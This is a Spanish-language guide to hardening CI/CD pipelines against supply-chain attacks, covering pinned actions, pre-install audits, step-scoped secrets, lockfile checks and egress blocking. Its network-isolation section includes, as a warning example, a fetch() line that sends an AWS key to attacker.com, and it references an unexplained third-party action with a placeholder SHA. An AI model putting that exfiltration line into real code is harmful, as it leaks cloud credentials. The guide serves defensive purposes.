# CI/CD Hardening — El Pipeline como Defensa

## Por Qué el CI/CD es un Vector Crítico

```
Los ataques de supply chain frecuentemente apuntan al CI/CD:
→ El CI/CD tiene acceso a secrets de producción
→ El CI/CD instala dependencias automáticamente (sin supervisión)
→ Un paquete malicioso ejecutado en CI puede exfiltrar todos los secrets del pipeline
→ Si el CI/CD está comprometido, el atacante puede desplegar código a producción

Los secretos que el CI/CD típicamente tiene acceso:
  - AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY
  - DATABASE_URL de producción
  - STRIPE_SECRET_KEY
  - NPM_TOKEN / PACKAGIST_TOKEN
  - DOCKER_REGISTRY_TOKEN
  - SSH keys para despliegue

Si un paquete malicioso se instala en CI → todos estos secrets están en riesgo.
```

---

## GitHub Actions — Hardening Completo

```yaml
# .github/workflows/deploy.yml — pipeline endurecido

name: Deploy

on:
  push:
    branches: [main]

# PRINCIPIO DE MENOR PRIVILEGIO — solo los permisos necesarios
permissions:
  contents: read        # leer el código
  packages: read        # leer paquetes de GitHub Packages
  deployments: write    # escribir estado del deployment

jobs:
  security-gate:
    runs-on: ubuntu-latest
    steps:
      # CRÍTICO: pinear todas las actions a commit SHA, no a tags
      # Un atacante que comprometa un action y modifique el tag = RCE en tu pipeline
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
      - uses: actions/setup-node@cdca7365b2dadb8aad0a33bc7601856ffabcc48e  # v4.3.0
      - uses: actions/setup-php@d6d70d1b7e3dd79a4b5e1e09e1a7dbd4a6c2b86f  # v2.31.0
        with:
          php-version: '8.4'  # leer de composer.json require.php

      # Auditoría ANTES de instalar todo
      - name: PHP Security Audit (sin instalar)
        run: |
          composer audit 2>&1 | tee composer-audit.log
          if grep -q "Found" composer-audit.log; then
            echo "::error::Vulnerabilities found in composer audit"
            cat composer-audit.log
            exit 1
          fi

      - name: npm Audit (sin instalar)
        run: npm audit --audit-level=high --production

      # Instalar SOLO después de que la auditoría pase
      - name: Install PHP deps (CI mode)
        run: composer install --no-interaction --prefer-dist --no-scripts
        # --no-scripts previene ejecución de scripts de Composer durante install
        # Luego ejecutar scripts específicos de forma controlada:
      - run: composer run-script post-install-cmd --no-interaction

      - name: Install npm deps (CI mode)
        run: npm ci --ignore-scripts
        # Solo ejecutar scripts específicos necesarios para build:
      - run: npm run build  # No postinstall general — solo lo que necesitas

  build-and-deploy:
    runs-on: ubuntu-latest
    needs: security-gate    # SOLO continuar si el security gate pasó
    environment: production # Requiere approval manual en environments críticos

    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

      # Secrets: nunca en logs, nunca en variables de entorno globales
      - name: Deploy
        env:
          # Solo los secrets necesarios para este step específico
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        run: ./scripts/deploy.sh
```

---

## Secrets en CI/CD — Mejores Prácticas

```yaml
# Lo que NO hacer:
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
  DATABASE_URL: ${{ secrets.DATABASE_URL }}
  STRIPE_SECRET: ${{ secrets.STRIPE_SECRET }}
  # Todos los secrets expuestos a todo el pipeline
  # Un paquete malicioso en CUALQUIER step tiene acceso a todos

# Lo que SÍ hacer:
jobs:
  build:
    steps:
      - name: Build (sin secrets)
        run: npm run build  # No necesita secrets

  deploy:
    steps:
      - name: Deploy to AWS
        env:
          # Solo los secrets del step que los necesita
          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        run: aws s3 sync dist/ s3://my-bucket/

# Principio: secrets scoped al step que los necesita, no al job ni al workflow
```

---

## Lockfile Verification — La Última Línea de Defensa

```bash
# En el CI/CD, verificar que los lockfiles no fueron modificados
# Un lockfile modificado en CI puede indicar un ataque man-in-the-middle

# Para Composer
- name: Verify composer.lock integrity
  run: |
    composer install --dry-run 2>&1 | grep -i "nothing to install"
    # Si hay cambios no esperados: el lockfile fue alterado

# Para npm
- name: Verify package-lock.json integrity
  run: |
    # npm ci falla si package-lock.json no coincide con package.json
    # Eso es una protección built-in
    npm ci

# Verificación de hash del lockfile (más defensivo)
- name: Lock file hash check
  run: |
    EXPECTED_HASH=$(git show HEAD:composer.lock | sha256sum | cut -d' ' -f1)
    ACTUAL_HASH=$(sha256sum composer.lock | cut -d' ' -f1)
    if [ "$EXPECTED_HASH" != "$ACTUAL_HASH" ]; then
      echo "::error::composer.lock was modified outside of git!"
      exit 1
    fi
```

---

## Aislamiento de Red en CI (Defensa Avanzada)

```yaml
# Bloquear requests salientes desde el paso de instalación
# Esto previene que un paquete malicioso exfiltre datos durante la instalación

- name: Install deps with network isolation
  # Usar una action que bloquea la red o un proxy permitido
  uses: nicowillis/harden-runner@[SHA]
  with:
    egress-policy: block
    allowed-endpoints: >
      registry.npmjs.org:443
      packagist.org:443
      github.com:443

# Sin esta protección:
# Un paquete malicioso puede hacer: fetch('https://attacker.com/steal?key=' + process.env.AWS_ACCESS_KEY_ID)

# Con StepSecurity Harden Runner (el que alerta CISA usar):
- uses: step-security/harden-runner@4d991eb9b905ef189e4c35b6b2499e23bfa9d4ac
  with:
    egress-policy: audit   # auditar primero
    # egress-policy: block # luego bloquear con whitelist

# Otros enfoques:
# - Usar runners en red privada sin salida a internet
# - Usar un proxy Composer/npm interno (Private Packagist, Verdaccio)
# - GitHub Actions network restrictions (Enterprise)
```

---

## Proteger tus Propios Paquetes (Si Eres Maintainer)

```
Si publicas paquetes npm o Composer, estas son tus responsabilidades:

AUTENTICACIÓN:
□ MFA habilitado en npm: 2FA obligatorio para publicar
  npm profile enable-2fa auth-and-writes
□ MFA habilitado en GitHub (protege el origen del código)
□ Usar Passkeys/FIDO2 si está disponible (más resistente a phishing)
□ Nunca usar tokens de publicación con scope global
  npm token create --cidr-whitelist [IP de CI] --read-only=false

PUBLICACIÓN:
□ Solo publicar desde CI/CD, nunca desde local
  → Elimina el riesgo de que el token de la máquina local sea robado
□ Usar Provenance para npm (vincula el paquete al commit exacto)
□ Usar Trusted Publishing en npm/PyPI (OIDC — sin tokens longevos)
□ Staged releasing: no publicar a todos inmediatamente

REPOSITORIO:
□ Branch protection en main
□ Required reviews antes de merge
□ GitHub Secret Scanning habilitado
□ Webhook monitoring para detectar tags nuevos no esperados

TOKENS:
□ Tokens de CI con el mínimo scope necesario
□ Rotación periódica de tokens
□ Revocar tokens inmediatamente al detectar un compromiso
□ Nunca hardcodear tokens en ningún archivo del repo
```
